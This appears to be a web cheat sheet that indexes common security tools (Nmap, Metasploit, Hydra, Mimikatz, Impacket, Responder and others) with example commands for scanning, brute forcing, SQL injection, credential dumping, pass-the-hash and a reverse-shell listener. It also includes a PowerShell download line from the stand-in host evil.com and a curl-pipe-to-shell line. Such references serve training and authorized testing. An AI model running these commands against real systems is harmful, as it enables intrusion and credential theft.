Security Tools Index

A curated list of SOC, OSINT, and Offensive Security tools.

Netcat (nc)

Networking
The "Swiss Army knife" of networking. Used for reading/writing data across network connections.
# Listen on port 4444 (Reverse Shell Listener) nc -lvnp 4444 # Connect to a port nc -v <target_ip> <port> # File Transfer (Receiver) nc -lvnp 1234 > received_file

Nmap

Networking
Network exploration tool and security / port scanner.
# Aggressive Scan (OS, Services, Scripts) nmap -A -v <target_ip> # Scan specific ports nmap -p 80,443,8080 <target_ip> # Scan all ports nmap -p- <target_ip>

Wireshark

Networking
The world's foremost network protocol analyzer.
# Filter by IP ip.addr == 192.168.1.10 # Filter by Protocol http || dns # Follow TCP Stream Right-click packet -> Follow -> TCP Stream

Metasploit Framework

Exploitation
The world's most used penetration testing framework.
# Start Console msfconsole # Search for module search type:exploit platform:windows eternalblue # Use module use exploit/windows/smb/ms17_010_eternalblue

Searchsploit

Exploitation
Command line search tool for Exploit-DB.
# Search for exploit searchsploit apache 2.4 # Mirror exploit to current dir searchsploit -m <id>

Hydra

Exploitation
A very fast network logon cracker which supports many different services.
# SSH Brute Force hydra -l user -P passlist.txt ssh://192.168.1.10

Burp Suite

Web
An integrated platform for performing security testing of web applications.
# Intercept Proxy -> Intercept -> Intercept is on # Repeater Send request to Repeater (Ctrl+R) to modify and resend.

Gobuster

Web
Directory/File, DNS and VHost busting tool written in Go.
# Directory Scan gobuster dir -u http://example.com -w /path/to/wordlist.txt # DNS Subdomain Scan gobuster dns -d example.com -w /path/to/wordlist.txt

SQLMap

Web
Automatic SQL injection and database takeover tool.
# Basic Scan sqlmap -u "http://example.com/page.php?id=1" --dbs # Dump Database sqlmap -u "..." -D dbname --dump

Volatility

Forensics
Advanced memory forensics framework.
# Image Info (Vol 2) volatility -f memory.dmp imageinfo # Process List volatility -f memory.dmp --profile=<profile> pslist

Autopsy

Forensics
The premier open source digital forensics platform. GUI for The Sleuth Kit.

FTK Imager

Forensics
Data preview and imaging tool. Used to acquire memory and disk images.

Sherlock

OSINT
Hunt down social media accounts by username across social networks.
# Search Username python3 sherlock.py username

Maltego

OSINT
Open source intelligence and forensics application. It offers visual link analysis.

TheHarvester

OSINT
Gather emails, subdomains, hosts, employee names, open ports and banners.
# Basic Search theHarvester -d example.com -b all

Shodan

OSINT
Search engine for Internet-connected devices. Find vulnerable systems, open ports, and exposed services.
# CLI Search shodan search "apache" # Host Info shodan host <ip_address> # Web Queries port:22 country:US webcam has_screenshot:true

John the Ripper

Cracking
Fast password cracker supporting hundreds of hash types and ciphers.
# Crack with wordlist john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt # Show cracked passwords john --show hash.txt # Specify format john --format=NT hash.txt

Hashcat

Cracking
World's fastest password recovery tool with GPU acceleration.
# Dictionary attack (mode 0) hashcat -m 1000 -a 0 hash.txt rockyou.txt # Common hash modes -m 0 MD5 -m 100 SHA1 -m 1000 NTLM -m 1800 SHA-512 (Unix) -m 3200 bcrypt # Show cracked hashcat --show hash.txt

ffuf

Web
Fast web fuzzer written in Go. Directory discovery, parameter fuzzing, vhost enumeration.
# Directory Fuzzing ffuf -u http://target/FUZZ -w wordlist.txt # Subdomain Fuzzing ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com" # POST Parameter Fuzzing ffuf -u http://target/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt # Filter by status/size ffuf -u http://target/FUZZ -w list.txt -fc 404 -fs 1234

Nikto

Web
Web server scanner that tests for dangerous files, outdated software, and misconfigurations.
# Basic scan nikto -h http://target.com # Scan specific port nikto -h target.com -p 8080 # Output to file nikto -h target.com -o report.html -Format htm

WPScan

Web
WordPress security scanner. Detects vulnerable plugins, themes, and users.
# Basic scan wpscan --url http://target.com # Enumerate users wpscan --url http://target.com -e u # Enumerate plugins wpscan --url http://target.com -e ap --plugins-detection aggressive # Password brute force wpscan --url http://target.com -U admin -P passwords.txt

OWASP ZAP

Web
Open-source web application security scanner and proxy. Free alternative to Burp Suite Pro.
# Automated Scan (CLI) zap-cli quick-scan http://target.com # Spider a site zap-cli spider http://target.com # Active scan zap-cli active-scan http://target.com

CrackMapExec / NetExec

AD/Windows
Swiss army knife for pentesting Windows/Active Directory environments.
# Check credentials (SMB) crackmapexec smb 192.168.1.0/24 -u user -p password # Pass-the-Hash crackmapexec smb target -u admin -H <NTLM_hash> # Dump SAM crackmapexec smb target -u admin -p pass --sam # Execute command crackmapexec smb target -u admin -p pass -x "whoami"

Impacket

AD/Windows
Collection of Python classes for working with network protocols. Essential for AD attacks.
# PSExec - Get shell psexec.py domain/user:password@target # Dump secrets secretsdump.py domain/user:password@target # WMI Exec wmiexec.py domain/user:password@target # Get TGT (Kerberos) getTGT.py domain/user:password

Responder

AD/Windows
LLMNR, NBT-NS and MDNS poisoner. Capture NTLMv2 hashes on the network.
# Start Responder responder -I eth0 -rdwv # Analyze mode (passive) responder -I eth0 -A

Evil-WinRM

AD/Windows
WinRM shell for hacking/pentesting. Feature-rich PowerShell remoting.
# Connect with password evil-winrm -i target -u user -p password # Connect with hash (PTH) evil-winrm -i target -u admin -H <NTLM_hash> # Upload/Download files upload /path/to/file download C:\file.txt

Mimikatz

AD/Windows
Extract plaintext passwords, hashes, PIN codes and Kerberos tickets from memory.
# Dump credentials privilege::debug sekurlsa::logonpasswords # Dump SAM lsadump::sam # Pass-the-Hash sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> # Golden Ticket kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-... /krbtgt:<hash>

BloodHound

AD/Windows
Active Directory attack path visualization. Find hidden relationships and privilege escalation paths.
# Collect data (SharpHound) SharpHound.exe -c All # Python collector bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> # Import JSON to BloodHound GUI Upload the .zip file to BloodHound

Masscan

Networking
Internet-scale port scanner. Can scan the entire Internet in under 6 minutes.
# Scan common ports masscan -p80,443,8080 192.168.1.0/24 --rate=1000 # Scan all ports masscan -p0-65535 target --rate=10000 # Output to file masscan -p1-65535 target -oG results.txt

RustScan

Networking
Modern port scanner. Scans all 65k ports in seconds, then pipes to Nmap.
# Quick scan + Nmap rustscan -a target -- -sC -sV # Scan specific ports rustscan -a target -p 80,443,8080 # Adjust batch size rustscan -a target -b 5000

tcpdump

Networking
Command-line packet analyzer. Capture and analyze network traffic.
# Capture on interface tcpdump -i eth0 # Filter by host tcpdump -i eth0 host 192.168.1.10 # Filter by port tcpdump -i eth0 port 80 # Save to pcap tcpdump -i eth0 -w capture.pcap

Enum4linux

Enumeration
Linux tool for enumerating information from Windows and Samba systems.
# Full enumeration enum4linux -a target # Get users enum4linux -U target # Get shares enum4linux -S target # enum4linux-ng (newer) enum4linux-ng -A target

Amass

OSINT
In-depth attack surface mapping and asset discovery using OSINT.
# Passive enumeration amass enum -passive -d target.com # Active enumeration amass enum -active -d target.com # Brute force subdomains amass enum -brute -d target.com -w wordlist.txt

Nuclei

Scanning
Fast vulnerability scanner based on templates. Thousands of community templates available.
# Scan with all templates nuclei -u http://target.com # Scan with specific templates nuclei -u http://target.com -t cves/ # Scan list of URLs nuclei -l urls.txt -t technologies/ # Update templates nuclei -ut

LinPEAS

PrivEsc
Linux Privilege Escalation Awesome Script. Comprehensive enumeration for privilege escalation vectors.
# Run from URL curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Run locally ./linpeas.sh # Fast mode ./linpeas.sh -a

WinPEAS

PrivEsc
Windows Privilege Escalation Awesome Script. Find misconfigurations and escalation paths.
# Run executable winPEASx64.exe # Run with all checks winPEASx64.exe -a # Specific category winPEASx64.exe servicesinfo

Radare2

Reversing
Complete framework for reverse engineering. Disassembler, debugger, and binary analysis.
# Open binary r2 binary # Analyze all aaa # List functions afl # Seek to main s main # Print disassembly pdf

Binwalk

Forensics
Firmware analysis tool. Scan and extract embedded files and executable code.
# Scan file binwalk firmware.bin # Extract files binwalk -e firmware.bin # Entropy analysis binwalk -E firmware.bin

Sysinternals Suite

Forensics/Admin
Essential Windows troubleshooting utilities (ProcMon, ProcExp, Autoruns, PsExec).

PowerShell

LOLBAS
Task automation and configuration management framework. Often used for LOLBAS attacks.
# Download File Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe" # Base64 Encode [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("string"))

CyberChef

General
The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.

Ghidra

Reversing
A software reverse engineering (SRE) suite of tools developed by NSA.
